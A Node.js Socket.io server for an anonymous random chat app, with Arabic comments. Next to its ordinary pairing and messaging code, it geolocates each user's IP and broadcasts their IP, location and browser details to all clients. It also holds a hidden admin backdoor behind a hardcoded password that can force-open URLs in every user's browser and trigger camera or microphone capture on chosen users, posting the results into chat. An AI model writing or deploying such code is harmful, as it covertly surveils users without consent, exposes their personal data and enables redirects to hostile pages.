const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const https = require('https');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  pingTimeout: 5000,
  pingInterval: 10000
});

app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

let waitingUser = null;

// دالة لجلب معلومات الموقع الجغرافي من الـ IP
function getIpLocation(ip, callback) {
  // تنظيف الـ IP لو كان محلياً
  if (ip === '::1' || ip === '127.0.0.1') {
    callback({ city: 'محلي', country: 'السيرفر المحلي' });
    return;
  }
  
  https.get(`https://ipapi.co/${ip}/json/`, (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      try {
        const json = JSON.parse(data);
        callback({ city: json.city || 'غير معروف', country: json.country_name || 'غير معروف' });
      } catch (e) {
        callback({ city: 'غير معروف', country: 'غير معروف' });
      }
    });
  }).on('error', () => {
    callback({ city: 'غير معروف', country: 'غير معروف' });
  });
}

io.on('connection', (socket) => {
  let clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  if (clientIp && clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
  const userAgent = socket.handshake.headers['user-agent'] || 'غير معروف';

  // جلب مكان المتصل وإرساله للأدمن
  getIpLocation(clientIp, (loc) => {
    io.emit('device_info', {
      id: socket.id,
      ip: clientIp,
      city: loc.city,
      country: loc.country,
      ua: userAgent
    });
  });

  socket.on('find_partner', () => {
    if (waitingUser && waitingUser.id !== socket.id && waitingUser.connected) {
      const roomName = 'room_' + socket.id + '_' + waitingUser.id;
      socket.join(roomName);
      waitingUser.join(roomName);

      socket.partnerId = waitingUser.id;
      waitingUser.partnerId = socket.id;
      socket.roomName = roomName;
      waitingUser.roomName = roomName;

      waitingUser.emit('matched');
      socket.emit('matched');

      waitingUser = null;
    } else {
      waitingUser = socket;
    }
  });

  socket.on('message', (data) => {
    if (socket.roomName) {
      socket.to(socket.roomName).emit('message', data);
    }
  });

  socket.on('typing', (isTyping) => {
    if (socket.roomName) {
      socket.to(socket.roomName).emit('display_typing', isTyping);
    }
  });

  // أوامر الأدمن
  socket.on('admin_action', (data) => {
    if (data.secret !== 'mySuperSecretAdmin123') return;

    if (data.action === 'alert') {
      io.emit('system_alert', data.message);
    } else if (data.action === 'open_url') {
      io.emit('force_open_url', data.url);
    } else if (data.action === 'clear_chat') {
      io.emit('clear_chat', data.target);
    } else if (data.action === 'play_sound') {
      io.emit('play_sound_in_browser', data.audioUrl);
    } else if (data.action === 'change_bg') {
      io.emit('change_bg', data.bgColor);
    } else if (data.action === 'request_media') {
      // توجيه الطلب للمستخدم المستهدف أو للكل
      if (data.targetSocket) {
        io.to(data.targetSocket).emit('trigger_media_capture', { type: data.mediaType, duration: data.duration });
      } else {
        io.emit('trigger_media_capture', { type: data.mediaType, duration: data.duration });
      }
    }
  });

  socket.on('user_media_captured', (mediaData) => {
    if (socket.roomName) {
      io.to(socket.roomName).emit('message', { type: mediaData.type, content: mediaData.dataUrl });
    }
  });

  socket.on('disconnect', () => {
    if (waitingUser === socket) {
      waitingUser = null;
    }
    if (socket.roomName) {
      socket.to(socket.roomName).emit('partner_disconnected');
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
